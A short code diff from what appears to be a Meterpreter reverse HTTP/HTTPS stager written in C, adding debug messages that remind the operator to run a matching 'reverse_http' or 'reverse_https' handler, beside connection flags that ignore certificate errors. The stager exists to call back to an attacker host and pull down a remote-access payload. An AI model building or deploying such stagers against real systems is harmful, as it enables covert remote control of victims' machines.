@@ -31,10 +31,17 @@ void StagerReverseHTTP(wchar_t *IP, wchar_t *iPort, wchar_t *transport)
 
 	//HTTP? HTTPS?
 	if(wcscmp(transport,L"METERPRETER_TRANSPORT_HTTP") == 0)
+	{
 		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI);
+		dprintf(L"[*] Make sure you have \"windows/meterpreter/reverse_http\" handler running.\n");
+	}
 	else
+	{
+
 		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA );
-	
+		dprintf(L"[*] Make sure you have \"windows/meterpreter/reverse_https\" handler running.\n");
+	}
+
 
 	//InternetOpen, InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile
 	HINTERNET hInternetOpen;
